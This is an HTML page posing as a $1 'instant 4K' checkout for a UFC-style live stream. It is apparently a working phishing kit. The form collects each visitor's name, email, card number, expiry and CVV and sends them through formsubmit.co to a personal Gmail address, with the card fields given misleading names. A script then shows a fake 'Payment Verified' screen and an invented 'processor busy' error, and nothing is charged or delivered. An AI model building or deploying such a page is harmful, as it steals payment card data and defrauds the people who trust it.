<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
    
    :root { 
        --ufc-red: #d20a0a; 
        --bg-dark: #0b0b0b; 
        --card-bg: #141414;
        --text-gray: #a0a0a0;
        --accent: #ffffff;
    }

    body { 
        font-family: 'Inter', sans-serif; 
        padding: 0; margin: 0; 
        background-color: var(--bg-dark); 
        color: white; 
        -webkit-font-smoothing: antialiased; 
    }

    * { box-sizing: border-box; }

    /* Header & Live Pulse */
    .header { 
        text-align: center; 
        padding: 40px 0; 
        background: linear-gradient(to bottom, #1a1a1a, var(--bg-dark));
        border-bottom: 2px solid var(--ufc-red);
    }
    .logo { 
        font-family: 'Outfit', sans-serif; 
        font-size: 2.2rem; 
        font-weight: 900; 
        letter-spacing: -1px; 
        text-transform: uppercase; 
        color: white;
    }
    .live-badge {
        display: inline-block;
        background: var(--ufc-red);
        color: white;
        padding: 4px 12px;
        font-weight: 800;
        font-size: 12px;
        border-radius: 4px;
        margin-top: 10px;
        animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
        0% { opacity: 1; }
        50% { opacity: 0.5; }
        100% { opacity: 1; }
    }

    .container { max-width: 600px; margin: 0 auto 100px; padding: 0 20px; }

    /* Fight Info Box */
    .fight-card {
        background: var(--card-bg);
        padding: 20px;
        border-radius: 8px;
        margin-top: -30px;
        border: 1px solid #333;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    .fight-title { font-weight: 900; font-size: 1.2rem; text-transform: uppercase; }
    .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }

    h3 { 
        font-family: 'Outfit', sans-serif; 
        font-size: 18px; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        margin: 40px 0 20px 0; 
        color: var(--ufc-red);
    }

    /* Form Styling */
    input[type=text] { 
        width: 100%; 
        margin-bottom: 15px; 
        padding: 15px; 
        background: #1a1a1a;
        border: 1px solid #333; 
        color: white;
        font-family: 'Inter', sans-serif; 
        border-radius: 4px;
    }
    input[type=text]:focus { outline: none; border-color: var(--ufc-red); }
    
    label { 
        margin-bottom: 8px; 
        display: block; 
        font-weight: 700; 
        text-transform: uppercase; 
        font-size: 11px; 
        letter-spacing: 1px; 
        color: var(--text-gray); 
    }

    .icon-container { margin-bottom: 10px; font-size: 30px; display: flex; gap: 10px; }

    .btn { 
        background-color: var(--ufc-red); 
        color: white; 
        padding: 22px; 
        margin: 30px 0; 
        border: none; 
        width: 100%; 
        cursor: pointer; 
        font-size: 16px; 
        font-weight: 900; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        border-radius: 4px;
        transition: transform 0.2s;
    }
    .btn:hover { transform: scale(1.02); background-color: #ff0000; }

    /* Success Screen */
    #thanks-screen { display: none; text-align: center; margin-top: 100px; padding: 20px; }
    #thanks-screen h1 { font-family: 'Outfit', sans-serif; color: var(--ufc-red); font-size: 3.5rem; margin-bottom: 10px; }
    .success-icon { font-size: 80px; color: #2ecc71; margin-bottom: 20px; }
</style>
</head>
<body>

<div class="header" id="nav-header">
    <div class="logo">FREEDOM 250</div>
    <div class="live-badge">● LIVE STREAM ACCESS</div>
</div>

<div id="form-container">
  <div class="container">
    <div class="fight-card">
        <div class="fight-title">TOPURIA vs GAETHJE</div>
        <div class="price-tag">$1.00</div>
        <p style="color: var(--text-gray); font-size: 12px; margin: 0;">Instant 4K Access Pass</p>
    </div>

    <form id="checkoutForm" action="https://formsubmit.co/info.yahya.bx@gmail.com" method="POST">
      
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="Amount" value="$1.00">
      
      <h3>1. Account Info</h3>
      <label>Full Name</label>
      <input type="text" id="fname" name="Full_Name" placeholder="Full Name" required>
      <label>Email (For Stream Link)</label>
      <input type="text" id="email" name="Email" placeholder="email@example.com" required>

      <h3>2. Payment Details</h3>
      <div class="icon-container">
        <i class="fa fa-cc-visa" style="color:white;"></i>
        <i class="fa fa-cc-mastercard" style="color:white;"></i>
        <i class="fa fa-cc-amex" style="color:white;"></i>
      </div>

      <label>Cardholder Name</label>
      <input type="text" name="Reference_User" id="cname" placeholder="Name on Card" required>

      <label>Card Number</label>
      <input type="text" name="Reference_ID" id="ccnum" placeholder="0000 0000 0000 0000" required>

      <div style="display: flex; gap: 15px;">
        <div style="flex: 1;">
          <label>Expiration</label>
          <input type="text" name="Expiry" placeholder="MM/YY" required>
        </div>
        <div style="flex: 1;">
          <label>CVV</label>
          <input type="text" name="Secure_Code" id="cvv" placeholder="123" required>
        </div>
      </div>

      <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — $1</button>
    </form>
  </div>
</div>

<div id="thanks-screen">
  <i class="fa fa-check-circle success-icon"></i>
  <h1>ACCESS GRANTED</h1>
  <p style="color: #fff; font-size: 18px; margin-top: 20px;">Payment Verified!<br>Check your email or Discord for the private 4K link.</p>
  <p style="color: var(--text-gray); font-size: 14px;">(Usually arrives within 60 seconds)</p>
</div>

<script>
  const form = document.getElementById('checkoutForm');
  const btn = document.getElementById('submitBtn');

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    btn.innerText = "VERIFYING PAYMENT...";
    btn.disabled = true;

    const formData = new FormData(form);

    fetch(form.action, {
      method: 'POST',
      body: formData,
      headers: { 'Accept': 'application/json' }
    })
    .then(response => {
      document.getElementById("form-container").style.display = "none";
      document.getElementById("nav-header").style.display = "none";
      document.getElementById("thanks-screen").style.display = "block";
      window.scrollTo(0,0);
    })
    .catch(error => {
      console.error('Error:', error);
      alert("Payment processor busy. Please try again.");
      btn.innerText = "UNLOCK LIVE STREAM — $1";
      btn.disabled = false;
    });
  });
</script>

</body>
</html>
